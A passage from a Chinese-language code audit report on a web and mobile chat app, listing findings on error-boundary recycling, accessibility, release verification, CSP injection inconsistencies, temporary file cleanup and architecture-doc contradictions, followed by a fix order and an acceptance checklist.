证据：`mobile/src/components/ErrorBoundary.tsx:110`–`:132` 的 MessageErrorBoundary 只设置 `hasError`，没有 reset、resetKey、componentDidUpdate；`mobile/src/components/chat/MessageItem.tsx:148` 使用边界但未传消息 identity；`mobile/src/components/chat/MessageList.tsx:578` 的独立消息组件在 FlashList 回收单元内没有改变该边界身份的显式机制。

某条用户消息/附件子组件渲染异常后，该边界会在同一组件实例生命周期内持续显示“消息渲染失败”，卸载并重新创建实例可以清除该状态。如果回收单元随后被同类型的新消息复用，边界的错误状态可能跟着复用；即使同一个消息后来被服务器补齐为正确内容，也没有可见重试或自动重置。

这不是“缺少错误边界”：已经有边界，问题是错误状态生命周期与被保护数据生命周期不同。AI 气泡内部某些 subItem 有 key，会缓解该分支，因此需要测试独立用户消息等具体回收路径，不能声称全部消息都会被污染。

建议引入稳定 resetKey（identity scope + sessionId + render key），数据身份改变时清错误；同一损坏数据不自动无限重试，提供明确的局部重试或重新获取消息入口。按 render key 上报脱敏的渲染错误计数，避免把用户正文放入 telemetry。优先采用边界 reset key，而非随意加 key 导致整条 FlashList 失去回收收益。

验收：人为让一条消息子组件抛错→滚出→回收显示新消息，后者必须正常；原消息 payload 修复或点击重试能恢复；持久坏消息不会引发重渲染死循环；用户/AI/附件不同 item type 均覆盖。

### UX-12 可访问性存在具体交互协议和名称缺口

等级：P2。状态：源码确认；不宣称完成 WCAG 全量认证。成本：1–3 人日。

证据与具体影响：

- `web/src/components/BusinessStepDetailPanel.tsx:80`–`:105` 声明 tablist/tab，却没有方向键、Home/End 和 roving tabIndex；所有步骤都进入 Tab 序列。长计划给键盘用户增加大量跳转，且行为与 tab 语义不一致。
- `web/src/components/ManagementShell/ManagementShell.tsx:37`–`:54`、`:70`–`:89` 管理与详情 tabs 有相同情况。按钮可以被 Tab/Enter 操作，因此是键盘协议不完整，不是“完全无法用键盘”。
- `web/src/components/HtmlPreviewPanel.tsx:122` 的仅 ChevronLeft 返回按钮没有 aria-label/title 或文本。应为“返回文件列表/返回会话”等有上下文的可访问名称。
- `mobile/src/components/LocalAppLockGate.tsx:11` 保持背景 children；锁层 `:18` 只有 accessibilityViewIsModal，未见统一对底层设置 Android `importantForAccessibility="no-hide-descendants"` 或 iOS `accessibilityElementsHidden`。真实 TalkBack/VoiceOver 能否继续遍历锁后的敏感正文必须专项验证；不能认为遮罩遮住像素就必然隐藏语义树。

建议把重复 tabs 收敛到项目现有可访问 tabs primitive，或明确实现完整键盘与 focus 管理；为图标按钮补充动作名称，并用针对性的 role/name 检查避免再遗漏。锁层激活时统一屏蔽背景可访问树，焦点移动到锁标题/解锁动作，解锁后恢复先前合理位置。现有 AdminSettingsModal 已有焦点陷阱和 Esc，这部分不要重复重写。

验收：纯键盘完成步骤选择、管理子页切换、返回、关闭；Tab 一次进入 tabs，左右键切项，focus-visible 可见；屏幕阅读器能读出当前项和图标动作。真机锁屏时背景消息不能被朗读或点到，取消解锁后焦点仍停留锁层。另行测字号放大、对比度、减弱动画和触控目标，不能从本次源码检查推导这些都已通过。

### UX-13 移动端发布仍缺真实设备与最终制品的完整证据

等级：P1 发布前验收门槛。状态：明确待验证，并非已发生线上 bug。成本：3–7 人日，取决于设备、账号与打包条件。

证据：`docs/mobile-m30-02-biometric-local-unlock-review.md:14`–`:22` 列出未完成的 Face ID/Touch ID、Android BiometricPrompt、29/30 秒后台边界、飞行模式和最终签名权限扫描；`docs/mobile-ios-v1-release.md:36`–`:39` 明确暂缓最低/最新 iOS、弱网、恢复、系统分享和商店资料验收。

已有生产 origin、构建身份、分享 extension 和签名验证设计是积极保障；它们证明不了用户在真实设备锁屏、系统权限弹窗、后台进程挂起、弱网恢复或 Share Extension 冷启动中一定能完成操作。特别是本次发现的原生下载、锁屏和文件清理问题恰好位于 mock 单测之外的系统边界。

建议把发布验收做成与 exact source SHA、build number、包 SHA256 和设备/OS 对应的记录。最小矩阵包括最低支持/最新 iOS、至少两类 Android OEM 和最低目标 API；冷启动、升级、重装、账号切换、通知/深链接、系统分享、附件选择、上传下载、断网后恢复、生物识别成功/取消/lockout/未录入、系统权限拒绝与重新授予。记录失败的用户可见行为和恢复方式，不只截“通过”截图。

验收交付：最终 signed IPA/AAB 的身份、entitlement/manifest、权限和隐私声明；脱敏录屏与网络证据；全部阻断项的修复 SHA；明确的 go/no-go 与例外接受人。若某项继续暂缓，报告和发布说明保留“未验证”，不能以构建成功、TestFlight 处理完成、契约测试通过替代。

### UX-14 HTML CSP 注入存在三份不同实现，旧路径可漏掉或过晚插入

等级：P2 条件风险。状态：源码确认。成本：0.5–1 人日；与 UX-01 统一策略一起处理。

证据：安全 helper `web/src/lib/htmlSandbox.ts:18`–`:27` 已明确将 CSP 放在不可信字节之前；但 `web/src/components/SystemPanel/index.tsx:275`–`:282` 仍用正则找 `<head>` 再插入，`web/src/components/scenarios/replay/ScenarioReplayView.tsx:57`–`:60` 没有 `<head>` 时甚至原样返回 HTML。

这两个旧实现违反了 helper 已说明的解析顺序原则：HTML 在 head 之前包含脚本/资源或 head 出现在畸形声明/注释里时，策略可能太迟或没有按预期生效；演示片段没有显式 head 时不注入 CSP。该风险独立于 UX-01 的自导航问题，即使之后选用有效 CSP，也可能根本没装上。

当前注释说明 custom HTML 只接受演示剧本内嵌来源，因此本次不把它表述成普通用户可直接利用的任意存储 XSS；需要控制剧本/上游 HTML 或遇到格式不标准的内容。供应链、后续扩大来源和维护误差仍可能把这条差异变成生产漏洞。

建议所有入口调用统一 helper，不复制 CSP 字符串注入逻辑；将演示来源限制在解析/服务边界落实而非只靠注释；以单一策略版本标识和共享测试样例维护。验收无 head、标准 doctype、PUBLIC/internal-subset、前置脚本、注释内 head、畸形 markup、正常图表/打印；每个入口都应实际经过同一策略，并跑浏览器请求拦截。

### UX-15 Artifact 原生下载的临时文件不在现有退出清理目录中

等级：P2 隐私和容量风险。状态：源码确认，实际残留多久由 OS 和用户使用决定。成本：1–2 人日。

证据：`mobile/src/utils/openOrShareFile.ts:31`–`:35` 将远程 Artifact 保存到 `Paths.cache/<Date.now()>-<safeName>`，没有 finally 清理、登记或预算；`FileDownloadCard.tsx:83`–`:84` 直接调用。认证退出清理 `AuthContext.tsx:148`–`:151` 调用的 fileCacheService 只删除 `Paths.cache/files`，见 `fileCacheService.ts:178`。根目录的 Artifact 下载并不属于该清理范围。

结果是用户退出或切换身份后，已下载的业务 Artifact 可能仍留在应用 cache 根目录；反复打开会生成不同时间戳副本，没有计入文件缓存 1 GB/700 MB 淘汰预算。OS 未来可能清除 cache，但没有承诺何时发生。当前没有证据表明 B 能从产品 UI 任意枚举这些文件，因此按本地残留和清理契约风险定级，而非直接断言跨租户读取 API 漏洞。

建议所有 Artifact 临时文件进入专用 identity/generation 子目录和 registry，统一纳入退出、锁屏策略、超时和容量预算。原生预览/分享需要文件存活一段时间，不能机械在 openOrShareFile Promise 返回后立刻删；应定义 lease，按 viewer/share 生命周期或保守有限 TTL 清理。迟到下载也必须检查身份并删除，避免退出后重建缓存。

验收：重复打开同一 Artifact 不无限累积；下载/分享取消和失败有清理；退出后本应用持有的文件全部按策略释放；系统分享复制到其它 App 的文件不属于本应用可回收范围，产品文案不承诺能撤回用户主动导出的副本。

### UX-16 架构文档存在内部矛盾，容易误导之后的修复路径

等级：P3。状态：已证实。成本：0.5–1 人日。

证据：`docs/architecture/project-architecture.md:300` 写“生产构建产物可由 server 直接托管”，而同文前部服务职责和部署章节明确 Web 由 OSS 承载、ECS recovery-web 为独立静态目录。文档更新时间仍是 2026-06-17，却包含后来部署设计。根 `CLAUDE.md` 中 workspace 示例也同时存在 tenant/user 与 username 两种表述。

状态实现也应注明实际入口：`shared/src/store/actions/sendChat.ts`、`wsReconnect.ts` 虽导出相关函数，本次检索未见两端 UI 直接使用这些发送/重连导出；当前 Web/Mobile 的 useChatAppState 分别约 2707/1819 行，实际复用的是 shared hooks/协议/投影等。只修改名称相似的 shared action 不一定修复真实产品行为。这里是维护路径风险，不是这些旧导出本身已造成生产 bug。

建议架构文档列出“当前真正挂载/调用的入口”和“兼容导出/候选迁移层”，为身份、队列、重连、watchdog、缓存分别写清单一权威与平台职责。逐项核对旧章节，不要仅更改日期。新增结构性变更时同步维护一个可追踪的责任表；若删除兼容导出，先查所有 workspace/package consumers 并通过针对性契约验证。

验收：阅读文档可准确定位当前 Web 托管路径、API 分域、移动发布 identity、useChatAppState 的实际发送/恢复调用链；同一事实没有互相冲突的描述。文档核对后再考虑大规模拆分，不建议为了本次体检先做无功能收益的大重构。

## 5. 建议修复顺序与拆分

第一批解决已实证边界：UX-01 的 HTML 网络策略、UX-02 的同身份续期、UX-03 的原生身份缓存、UX-05 的持久化失败语义。UX-04/06 与 UX-03 一起完成移动锁/传输专题，避免先修缓存 key 却保留门禁旁路。每个专题包含一个最小可复现失败样例和不回退安全边界的回归样例。

第二批解决日常可用性：UX-08 管理缓存及首次登录空数据、UX-07 所有恢复探针的有限等待、UX-09 网络三态。先验证真实链路，再做局部修复；保留已经工作的前台 coalescing、generation fence、分页锚点和 canonical 管理入口。

第三批开展明确容量与辅助技术验收：UX-10、UX-11、UX-12。先记录产品目标设备与数据规模，避免以“用了虚拟列表”“加了 aria 属性”作为验收终点。UX-14/15 可分别并入 HTML 和原生文件专题，UX-16 随对应变更同步整理。

移动公开发布前集中补齐 UX-13，验收必须针对最终修复后的 exact 制品，不能沿用本次检查前的截图或历史证据封签。

## 6. 后续 review 可直接使用的验收清单

| 场景             | 关键操作                                           | 必须满足的事实                                      |
| ---------------- | -------------------------------------------------- | --------------------------------------------------- |
| 同身份续期       | 并发 GET 和已提交 POST，其中一个返回 refresh token | 两个业务响应均可消费；POST 不自动重放               |
| 真实身份切换     | A 响应迟到时已登录 B                               | A 不能写凭据、消息、用户列表、文件 index 或启动分享 |
| Web 存储故障     | token/binding/journal 分别写失败                   | 不返回假登录成功；不混用 A/B 存储；有恢复提示       |
| 移动文件清理竞态 | A 下载中退出，B 打开同路径                         | B 不等待 A inflight；A 迟到结果不能进入 B 缓存      |
| 文件名完整性     | Aa.pdf 与 B@.pdf 等碰撞样例                        | 两个文件内容独立且可验证                            |
| 本地锁           | 已开启 policy，能力查询异常/录入变化               | 继续保持锁定或合法 fallback，不自动 full access     |
| offline shell    | 网络恢复但尚未复核服务器身份                       | HTTP/原生下载/WS 均不恢复敏感传输                   |
| HTML 预览        | JS 自导航、meta refresh、资源加载、链接、打印      | 按所选产品模式达到实际网络边界；parent 仍隔离       |
| 管理首次登录     | 匿名页面直接登录 admin，不刷新                     | 用户/组织数据可正常加载、错误可重试                 |
| 管理跨身份       | 退出当前账号自动进入剩余账号                       | 所有消费者仅展示当前 identity 的数据                |
| 连接挂起         | 响应无限慢、body 不结束、网络切换                  | 截止时间内离开不可恢复等待；旧探针不覆盖新状态      |
| 消息回收         | 渲染错误 item 后滚动复用原生 cell                  | 后续正常 item 不继承错误，原消息有恢复方式          |
| 超长运行         | 单 run 数百/数千 blocks 与持续流式更新             | 按目标设备预算量化，交互与最终内容保持完整          |
| 可访问性         | 键盘 tabs、图标返回、锁屏读屏                      | 可访问名称、焦点协议、锁后语义隐藏均通过            |
| 发布证据         | exact SHA、signed package、目标设备矩阵            | 代码、包、权限、录屏、失败修复记录可相互追溯        |

本报告的发现是当前代码快照的体检结果。以后逐项 review 时应先确认该条所在代码是否已变化，再沿同一触发条件复验；不要把“有一个测试通过”或“旧报告说有问题”分别当成全盘通过与继续存在的充分证据。
